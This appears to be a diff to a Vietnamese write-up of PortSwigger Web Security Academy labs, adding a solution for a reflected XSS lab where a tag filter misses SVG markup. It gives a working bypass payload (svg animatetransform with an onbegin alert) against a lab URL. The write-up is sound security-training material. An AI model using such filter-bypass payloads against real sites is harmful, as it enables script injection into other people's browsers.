@@ -246,3 +246,45 @@ Decode cho dễ đọc như sau:
 Lab Solved!
 
 <img width="586" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/825cbc2b-542d-4fd6-a804-222163dbb2c4">
+
+***
+
+## 8. Lab: Reflected XSS with some SVG markup allowed
+
+* Content:
+```
+This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert() function.
+```
+* Exploit:
+
+Tương tự lab trước, xác định các tags không bị blocks
+
+<img width="426" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5a5db289-ca46-4853-a5c4-e3b863773cd9">
+
+=> Xác định thẻ `svg` không bị block.
+Tiếp tục thay payload sau vào phần search trong Intruder để test xem Events nào không bị chặn
+
+<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/dd8e463b-2b71-4bed-84b6-8a75164a42ae">
+
+Xác nhận thấy event `onbegin` không bị filter chặn
+
+<img width="421" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/cbe8234a-00bb-4e1a-b0f8-ff70017e18be">
+
+=> Sử dụng payload như sau:
+
+`https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`
+
+Decode: 
+
+`https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>`
+
+Lab Solved!
+
+<img width="578" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/904a0330-1565-406f-bfd2-e92c3a6ae1ce">
+
+***
+
+## 9. 
+
